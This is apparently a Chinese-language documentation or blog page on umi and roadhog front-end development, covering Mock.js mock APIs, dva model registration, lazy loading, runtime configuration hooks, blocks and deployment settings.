<h2 id="引入-Mock-js"><a href="#引入-Mock-js" class="headerlink" title="引入 Mock.js"></a>引入 Mock.js</h2><p>Mock.js 是常用的辅助生成模拟数据的第三方库，当然你可以用你喜欢的任意库来结合 roadhog 构建数据模拟功能。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mockjs <span class="keyword">from</span> <span class="string">'mockjs'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">// 使用 mockjs 等三方库</span></span><br><span class="line">  <span class="string">'GET /api/tags'</span>: mockjs.mock(&#123;</span><br><span class="line">    <span class="string">'list|100'</span>: [&#123; <span class="attr">name</span>: <span class="string">'@city'</span>, <span class="string">'value|1-100'</span>: <span class="number">50</span>, <span class="string">'type|0-2'</span>: <span class="number">1</span> &#125;],</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>添加跨域请求头<br>设置 response 的请求头即可：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'POST /api/users/create'</span>: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  res.setHeader(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<h2 id="合理的拆分你的-mock-文件"><a href="#合理的拆分你的-mock-文件" class="headerlink" title="合理的拆分你的 mock 文件"></a>合理的拆分你的 mock 文件</h2><p>对于整个系统来说，请求接口是复杂并且繁多的，为了处理大量模拟请求的场景，我们通常把每一个数据模型抽象成一个文件，统一放在 mock 的文件夹中，然后他们会自动被引入。</p>
<h2 id="如何模拟延迟"><a href="#如何模拟延迟" class="headerlink" title="如何模拟延迟"></a>如何模拟延迟</h2><p>为了更加真实的模拟网络数据请求，往往需要模拟网络延迟时间。</p>
<h1 id="手动添加-setTimeout-模拟延迟"><a href="#手动添加-setTimeout-模拟延迟" class="headerlink" title="手动添加 setTimeout 模拟延迟"></a>手动添加 setTimeout 模拟延迟</h1><p>你可以在重写请求的代理方法，在其中添加模拟延迟的处理，如：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'POST /api/forms'</span>: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    res.send(<span class="string">'Ok'</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<p>使用插件模拟延迟<br>上面的方法虽然简便，但是当你需要添加所有的请求延迟的时候，可能就麻烦了，不过可以通过第三方插件来简化这个问题，如：roadhog-api-doc#delay。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; delay &#125; <span class="keyword">from</span> <span class="string">'roadhog-api-doc'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proxy = &#123;</span><br><span class="line">  <span class="string">'GET /api/project/notice'</span>: getNotice,</span><br><span class="line">  <span class="string">'GET /api/activities'</span>: getActivities,</span><br><span class="line">  <span class="string">'GET /api/rule'</span>: getRule,</span><br><span class="line">  <span class="string">'GET /api/tags'</span>: mockjs.mock(&#123;</span><br><span class="line">    <span class="string">'list|100'</span>: [&#123; <span class="attr">name</span>: <span class="string">'@city'</span>, <span class="string">'value|1-100'</span>: <span class="number">50</span>, <span class="string">'type|0-2'</span>: <span class="number">1</span> &#125;]</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="string">'GET /api/fake_list'</span>: getFakeList,</span><br><span class="line">  <span class="string">'GET /api/fake_chart_data'</span>: getFakeChartData,</span><br><span class="line">  <span class="string">'GET /api/profile/basic'</span>: getProfileBasicData,</span><br><span class="line">  <span class="string">'GET /api/profile/advanced'</span>: getProfileAdvancedData,</span><br><span class="line">  <span class="string">'POST /api/register'</span>: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.send(&#123; <span class="attr">status</span>: <span class="string">'ok'</span> &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">'GET /api/notices'</span>: getNotices,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 delay 函数，统一处理</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> delay(proxy, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="动态-Mock-数据"><a href="#动态-Mock-数据" class="headerlink" title="动态 Mock 数据"></a>动态 Mock 数据</h2><p>如果你需要动态生成 Mock 数据，你应该通过函数进行处理，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 静态的</span></span><br><span class="line"><span class="string">'/api/random'</span>: Mock.mock(&#123;</span><br><span class="line">  <span class="comment">// 只随机一次</span></span><br><span class="line">  <span class="string">'number|1-100'</span>: <span class="number">100</span>,</span><br><span class="line">&#125;),</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态的</span></span><br><span class="line"><span class="string">'/api/random'</span>: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.send(Mock.mock(&#123;</span><br><span class="line">    <span class="comment">// 每次请求均产生随机值</span></span><br><span class="line">    <span class="string">'number|1-100'</span>: <span class="number">100</span>,</span><br><span class="line">  &#125;))</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<h2 id="联调"><a href="#联调" class="headerlink" title="联调"></a>联调</h2><p>当本地开发完毕之后，如果服务器的接口满足之前的约定，那么你只需要不开本地代理或者重定向代理到目标服务器就可以访问真实的服务端数据，非常方便。</p>
<h2 id="Use-umi-with-dva"><a href="#Use-umi-with-dva" class="headerlink" title="Use umi with dva"></a>Use umi with dva</h2><p>自&gt;= umi@2起，dva的整合可以直接通过 umi-plugin-react 来配置。</p>
<p>特性<br>.按目录约定注册 model，无需手动 app.model<br>.文件名即 namespace，可以省去 model 导出的 namespace key<br>.无需手写 router.js，交给 umi 处理，支持 model 和 component 的按需加载<br>.内置 query-string 处理，无需再手动解码和编码<br>.内置 dva-loading 和 dva-immer，其中 dva-immer 需通过配置开启<br>.开箱即用，无需安装额外依赖，比如 dva、dva-loading、dva-immer、path-to-regexp、object-assign、react、react-dom 等</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>用 yarn 安装依赖，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yarn add umi-plugin-react</span><br></pre></td></tr></table></figure></p>
<p>如果你用 npm，执行 npm install –save umi-plugin-react。<br>然后在 .umirc.js 里配置插件：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">'umi-plugin-react'</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        dva: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>推荐开启 dva-immer 以简化 reducer 编写，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">'umi-plugin-react'</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        dva: &#123;</span><br><span class="line">          immer: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="model-注册"><a href="#model-注册" class="headerlink" title="model 注册"></a>model 注册</h2><p>model 分两类，一是全局 model，二是页面 model。全局 model 存于 /src/models/ 目录，所有页面都可引用；页面 model 不能被其他页面所引用。</p>
<p>规则如下：<br>. src/models/<strong>/*.js 为 global model<br>. src/pages/</strong>/models/<strong>/*.js 为 page model<br>. global model 全量载入，page model 在 production 时按需载入，在 development 时全量载入<br>. page model 为 page js 所在路径下 models/</strong>/<em>.js 的文件<br>. page model 会向上查找，比如 page js 为 pages/a/b.js，他的 page . model 为 pages/a/b/models/**/</em>.js + pages/a/models/<strong>/*.js，依次类推<br>. 约定 model.js 为单文件 model，解决只有一个 model 时不需要建 models 目录的问题，有 model.js 则不去找 models/</strong>/*.js</p>
<p>举个例子，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ src</span><br><span class="line">  + models</span><br><span class="line">    - g.js</span><br><span class="line">  + pages</span><br><span class="line">    + a</span><br><span class="line">      + models</span><br><span class="line">        - a.js</span><br><span class="line">        - b.js</span><br><span class="line">        + ss</span><br><span class="line">          - s.js</span><br><span class="line">      - page.js</span><br><span class="line">    + c</span><br><span class="line">      - model.js</span><br><span class="line">      + d</span><br><span class="line">        + models</span><br><span class="line">          - d.js</span><br><span class="line">        - page.js</span><br><span class="line">      - page.js</span><br></pre></td></tr></table></figure></p>
<p>如上目录：<br>global model 为 src/models/g.js<br>/a 的 page model 为 src/pages/a/models/{a,b,ss/s}.js<br>/c 的 page model 为 src/pages/c/model.js<br>/c/d 的 page model 为 src/pages/c/model.js, src/pages/c/d/models/d.js</p>
<p>配置及插件<br>之前在 src/dva.js 下进行配置的方式已 deprecated，下个大版本会移除支持。</p>
<h2 id="在-src-目录下新建-app-js，内容如下："><a href="#在-src-目录下新建-app-js，内容如下：" class="headerlink" title="在 src 目录下新建 app.js，内容如下："></a>在 src 目录下新建 app.js，内容如下：</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> dva = &#123;</span><br><span class="line">  config: &#123;</span><br><span class="line">    onError(e) &#123;</span><br><span class="line">      e.preventDefault();</span><br><span class="line">      <span class="built_in">console</span>.error(e.message);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">'dva-logger'</span>)(),</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>url 变化了，但页面组件不刷新，是什么原因？<br>layouts/index.js 里如果用了 connect 传数据，需要用 umi/withRouter 高阶一下。<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> withRouter <span class="keyword">from</span> <span class="string">'umi/withRouter'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> withRouter(connect(mapStateToProps)(LayoutComponent));</span><br></pre></td></tr></table></figure></p>
<p>如何访问到 store 或 dispatch 方法？<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.g_app._store</span><br><span class="line">window.g_app._store.dispatch</span><br></pre></td></tr></table></figure></p>
<p>如何禁用包括 component 和 models 的按需加载？<br>在 .umirc.js 里配置：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">'umi-plugin-react'</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        dva: &#123;</span><br><span class="line">          dynamicImport: <span class="literal">undefined</span> <span class="comment">// 配置在dva里</span></span><br><span class="line">        &#125;,</span><br><span class="line">        dynamicImport: <span class="literal">undefined</span>   <span class="comment">// 或者直接写在react插件的根配置，写在这里也会被继承到上面的dva配置里</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>全局 layout 使用 connect 后路由切换后没有刷新？</p>
<p>需用 withRouter 包一下导出的 react 组件，注意顺序。<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> withRouter <span class="keyword">from</span> <span class="string">'umi/withRouter'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> withRouter(connect()(Layout));</span><br></pre></td></tr></table></figure></p>
<h2 id="按需加载"><a href="#按需加载" class="headerlink" title="按需加载"></a>按需加载</h2><p>出于性能的考虑，我们会对模块和组件进行按需加载。</p>
<h2 id="按需加载组件"><a href="#按需加载组件" class="headerlink" title="按需加载组件"></a>按需加载组件</h2><p>通过 umi/dynamic 接口实现，比如：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dynamic <span class="keyword">from</span> <span class="string">'umi/dynamic'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> delay = <span class="function">(<span class="params">timeout</span>) =&gt;</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> setTimeout(resolve, timeout));</span><br><span class="line"><span class="keyword">const</span> App = dynamic(&#123;</span><br><span class="line">  loader: <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> delay(<span class="comment">/* 1s */</span><span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>I will render after 1s<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="按需加载模块"><a href="#按需加载模块" class="headerlink" title="按需加载模块"></a>按需加载模块</h2><p>通过 import() 实现，比如：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">'g2'</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// do something with g2</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="运行时配置"><a href="#运行时配置" class="headerlink" title="运行时配置"></a>运行时配置</h2><p>为什么有运行时配置？</p>
<p>我们通过 .umirc.js 做编译时的配置，这能覆盖大量场景，但有一些却是编译时很难触及的。比如：<br>.在出错时显示个 message 提示用户<br>.在加载和路由切换时显示个 loading<br>.页面载入完成时请求后端，根据响应动态修改路由<br>这些在编译时就很难处理，或者不能处理了。</p>
<h2 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h2><p>umi 约定 src 目录下的 app.js 为运行时的配置文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ src</span><br><span class="line">  - app.js      # 运行时配置文件</span><br><span class="line">- package.json</span><br></pre></td></tr></table></figure></p>
<h2 id="配置列表"><a href="#配置列表" class="headerlink" title="配置列表"></a>配置列表</h2><h1 id="patchRoutes"><a href="#patchRoutes" class="headerlink" title="patchRoutes"></a>patchRoutes</h1><p>用于运行时修改路由。<br>参数：<br>routes: Array，路由配置<br>e.g. 添加一个 /foo 的路由，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">patchRoutes</span>(<span class="params">routes</span>) </span>&#123;</span><br><span class="line">  routes[<span class="number">0</span>].unshift(&#123;</span><br><span class="line">    path: <span class="string">'/foo'</span>,</span><br><span class="line">    component: <span class="built_in">require</span>(<span class="string">'./routes/foo'</span>).default,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可能的场景：<br>. 和 render 配合使用，请求服务端根据响应动态更新路由,<br>. 修改全部路由，加上某个前缀<br>…<br>注：<br>1.同样适用约定式路由<br>2.直接修改 routes 就好，不要返回新的路由对象</p>
<h2 id="render"><a href="#render" class="headerlink" title="render"></a>render</h2><p>用于改写把整个应用 render 到 dom 树里的方法。</p>
<p>参数：<br>. oldRender， Function，原始 render 方法，需至少被调用一次<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">oldRender</span>) </span>&#123;</span><br><span class="line">  setTimeout(oldRender, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可能的场景：</p>
<p>渲染应用之前做权限校验，不通过则跳转到登录页</p>
<h2 id="onRouteChange"><a href="#onRouteChange" class="headerlink" title="onRouteChange"></a>onRouteChange</h2><p>用于在初始加载和路由切换时做一些事情。</p>
<p>参数：</p>
<p>Object<br>location：Object, history 提供的 location 对象<br>routes: Array, 路由配置<br>action: PUSH|POP|REPLACE|undefined，初次加载时为 undefined<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">onRouteChange</span>(<span class="params">&#123; location, routes, action &#125;</span>) </span>&#123;</span><br><span class="line">  bacon(location.pathname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可能的场景：<br>埋点统计<br>注：<br>1.初次加载时也会执行，但 action 为 undefined</p>
<h2 id="rootContainer"><a href="#rootContainer" class="headerlink" title="rootContainer"></a>rootContainer</h2><p>用于封装 root container，可以取一部分，或者外面套一层，等等。</p>
<p>参数：</p>
<p>container，ReactComponent，React 应用最上层的根组件<br>e.g.<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">rootContainer</span>(<span class="params">container</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> DvaContainer = <span class="built_in">require</span>(<span class="string">'@tmp/DvaContainer'</span>).default;</span><br><span class="line">  <span class="keyword">return</span> React.createElement(DvaContainer, <span class="literal">null</span>, container);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可能的场景：<br>1.dva、intl 等需要在外层有个 Provider 的场景</p>
<h2 id="modifyRouteProps"><a href="#modifyRouteProps" class="headerlink" title="modifyRouteProps"></a>modifyRouteProps</h2><p>修改传给路由组件的 props。<br>参数：<br>props，Object，原始 props<br>Object<br>route，Object，当前路由配置<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">modifyRouteProps</span>(<span class="params">props, &#123; route &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; ...props, <span class="attr">foo</span>: <span class="string">'bar'</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注：需返回新的 props</p>
<h1 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h1><p>在 umi 中，区块是指页面级别的可复用的代码。umi 定义了一个区块的规范，你可以通过 umi 能够快速简单的在你的项目中添加区块，用于快速的开始一个页面的开发。</p>
<h2 id="使用区块"><a href="#使用区块" class="headerlink" title="使用区块"></a>使用区块</h2><p>在项目根目录使用如下命令可以添加一个区块到到你的项目中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ umi block add [block url]</span><br></pre></td></tr></table></figure></p>
<p>其中 [block url] 可以是一个 Github 或者 Gitlab 地址，也可以是一个 Git 仓库地址，也可以是一个本地相对或者绝对路径。只要对应的路径下是一个区块的代码，满足 umi 区块的规范，那么 umi 就可以通过该命令将区块的代码下载到你的项目中。<br>比如，你可以运行<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ umi block add https://github.com/umijs/umi-blocks/tree/master/blank</span><br></pre></td></tr></table></figure></p>
<p>来将官方的区块仓库中的 blank 区块下载到你的项目本地。对于官方区块仓库下的区块你可以使用更加简洁的命令，比如 umi block add blank 来下载区块。</p>
<p>如果你的项目正在本地调试，那么区块下载到项目中后你就可以访问相应的路径来查看效果了。区块代码会被默认下载到 pages/[name] 下面，其中 name 是默认取区块中的 package.json 中的 name字段（会去掉/前的无效片段）。对于配置式路由，我们也会默认添加路由配置到你的配置中，所以也一样可以直接访问。</p>
<p>你可以通过 umi help block 来查看支持的更多配置。</p>
<p>需要注意的是，区块只是用于开发时新建页面时的提效工具，一般来说区块要实际应用都需要针对项目需求去修改最后的代码，之后的维护都将和普通页面一样由开发者来维护，不存在区块更新的说法。</p>
<h2 id="区块开发"><a href="#区块开发" class="headerlink" title="区块开发"></a>区块开发</h2><h1 id="初始化区块"><a href="#初始化区块" class="headerlink" title="初始化区块"></a>初始化区块</h1><p>你可以通过 create-umi 快速创建一个区块的模板：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ yarn create umi --block</span><br></pre></td></tr></table></figure></p>
<p>区块的目录结构如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- root</span><br><span class="line">  - src              // 区块的代码</span><br><span class="line">    - index.js       // 区块入口，需要默认导出一个 React 组件</span><br><span class="line">    - _mock.js       // 约定的 mock 文件</span><br><span class="line">  - @                // 区块依赖的一些需要放到项目 src 下的内容（通常不推荐采用）</span><br><span class="line">  - package.json     // 区块依赖等信息</span><br><span class="line">  - .umirc.js        // 基于 umi 开发区块时的配置</span><br><span class="line">  - thumb.[png|jpg]  // 物料的缩略图</span><br></pre></td></tr></table></figure></p>
<p>其中 package.json 文件相关内容如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name: <span class="string">'@umi-blocks/blank'</span>,</span><br><span class="line">  description: <span class="string">'区块描述'</span>,</span><br><span class="line">  <span class="comment">// ... 更多其他 npm 包的相关定义</span></span><br><span class="line">  dependencies: &#123;</span><br><span class="line">    <span class="comment">// dependencies 里面是区块运行时阶段的依赖，比如 antd g2 这些包的依赖</span></span><br><span class="line">    antd: <span class="string">'^3.0.0'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  devDependencies: &#123;</span><br><span class="line">    <span class="comment">// 用户调试区块时候的依赖，和区块没有直接关系，可以提供基于 umi 的开发方案</span></span><br><span class="line">  &#125;,</span><br><span class="line">  scripts: &#123;</span><br><span class="line">    <span class="comment">// 开发区块调试时的命令，和区块没有直接关系</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="区块添加逻辑"><a href="#区块添加逻辑" class="headerlink" title="区块添加逻辑"></a>区块添加逻辑</h2><p>当执行 umi block add [block url] 的时候实际上是执行的如下步骤：</p>
<p>通过 git clone 下载区块代码（如果已经存在则会通过 git pull 更新）<br>检测区块的 package.json 中的依赖并自动安装到项目中<br>将区块代码复制到对应的页面目录，复制过程中会做一些宏替换<br>如果是配置式路由，那么会自动添加路由<br>另外，如果在项目中配置了 singular 为 true，那么这个处理过程也会将对应的复数目录改为单数。</p>
<h2 id="宏替换"><a href="#宏替换" class="headerlink" title="宏替换"></a>宏替换</h2><p>为了避免区块添加到应用中出现冲突，umi 提供了一些宏，当区块被添加到项目中时，区块代码中的宏也会按照区块对应的信息被替换。通过这个能力可以避免诸如 dva model 的 namespace 冲突等问题。</p>
<p>具体的宏如下，基于 –path=/Test_Hello/hello-Block 示例。</p>
<p>ROUTE_PATH /test_hello/hello-block<br>BLOCK_NAME test_hello-hello-block<br>PAGE_NAME hello-block<br>PAGE_NAME_UPPER_CAMEL_CASE HelloBlock<br>BLOCK_NAME_CAMEL_CASE testHelloHelloBlock</p>
<h2 id="区块调试"><a href="#区块调试" class="headerlink" title="区块调试"></a>区块调试</h2><p>区块调试基于 umi-plugin-block-dev 这个插件，基于该插件你就可以把区块当做一个普通的 umi 项目来调试了。如下所示，在区块的根目录下添加 .umirc.js 文件（通过 create-umi 创建的区块脚手架会自带该文件）。<br>export default {<br>  plugins: [<br>    [‘umi-plugin-block-dev’, {<br>      layout: ‘ant-design-pro’,<br>    }],<br>  ],<br>}<br>该插件会将区块的 src 目录作为 umi 的 pages 目录，这样你就可以在区块根目录下通过 umi dev 来开发调试区块了。</p>
<p>如果你觉得的区块质量较好，你可以通过提交 PR 来把它添加到 官方区块仓库 中。</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>默认方案<br>umi@2 默认对新手友好，所以默认不做按需加载处理，umi build 后输出 index.html、umi.js 和 umi.css 三个文件。</p>
<h2 id="不输出-html-文件"><a href="#不输出-html-文件" class="headerlink" title="不输出 html 文件"></a>不输出 html 文件</h2><p>某些场景 html 文件交给后端输出，前端构建并不需要输出 html 文件，可配置环境变量 HTML=none 实现。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ HTML=none umi build</span><br></pre></td></tr></table></figure></p>
<h2 id="部署-html-到非根目录"><a href="#部署-html-到非根目录" class="headerlink" title="部署 html 到非根目录"></a>部署 html 到非根目录</h2><p>经常有同学问这个问题：</p>
<p>为什么我本地开发是好的，部署后就没反应了，而且没有报错？</p>
<p>没有报错！ 这是应用部署在非根路径的典型现象。为啥会有这个问题？因为路由没有匹配上，比如你把应用部署在 /xxx/ 下，然后访问 /xxx/hello，而代码里匹配的是 /hello，那就匹配不上了，而又没有定义 fallback 的路由，比如 404，那就会显示空白页。<br>怎么解决？可通过配置 base 解决。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  base: <span class="string">'/path/to/your/app/root'</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>使用 hashHistory<br>可通过配置 history 为 hash 为解决。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  history: <span class="string">'hash'</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>按需加载<br>要实现按需加载，需装载 umi-plugin-react 插件并配置 dynamicImport。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    [<span class="string">'umi-plugin-react'</span>, &#123;</span><br><span class="line">      dynamicImport: <span class="literal">true</span>,</span><br><span class="line">    &#125;],</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>参数详见：umi-plugin-react#dynamicImport。</p>
<h2 id="静态资源在非根目录或-cdn"><a href="#静态资源在非根目录或-cdn" class="headerlink" title="静态资源在非根目录或 cdn"></a>静态资源在非根目录或 cdn</h2><p>这时，就需要配置 publicPath。至于 publicPath 是啥？具体看 webpack 文档，把他指向静态资源（js、css、图片、字体等）所在的路径。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  publicPath: <span class="string">"http://yourcdn/path/to/static/"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用 runtime 的 publicPath<br>对于需要在 html 里管理 publicPath 的场景，比如在 html 里判断环境做不同的输出，可通过配置 runtimePublicPath 为解决。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  runtimePublicPath: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>然后在 html 里输出：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.publicPath = &lt;%= YOUR PUBLIC_PATH %&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>静态化<br>在一些场景中，无法做服务端的 html fallback，即让每个路由都输出 index.html 的内容，那么就要做静态化。<br>比如上面的例子，我们在 .umirc.js 里配置：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  exportStatic: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后执行 umi build，会为每个路由输出一个 html 文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./dist</span><br><span class="line">├── index.html</span><br><span class="line">├── list</span><br><span class="line">│   └── index.html</span><br><span class="line">└── static</span><br><span class="line">    ├── pages__index.5c0f5f51.async.js</span><br><span class="line">    ├── pages__list.f940b099.async.js</span><br><span class="line">    ├── umi.2eaebd79.js</span><br><span class="line">    └── umi.f4cb51da.css</span><br></pre></td></tr></table></figure></p>
<p>注意：静态化暂不支持有变量路由的场景。</p>
<h2 id="HTML-后缀"><a href="#HTML-后缀" class="headerlink" title="HTML 后缀"></a>HTML 后缀</h2><p>有些静态化的场景里，是不会自动读索引文件的，比如支付宝的容器环境，那么就不能生成这种 html 文件，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── index.html</span><br><span class="line">├── list</span><br><span class="line">│   └── index.html</span><br></pre></td></tr></table></figure></p>
<p>而是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── index.html</span><br><span class="line">└── list.html</span><br></pre></td></tr></table></figure></p>
<p>配置方式是在 .umirc.js 里，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  exportStatic: &#123;</span><br><span class="line">    htmlSuffix: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
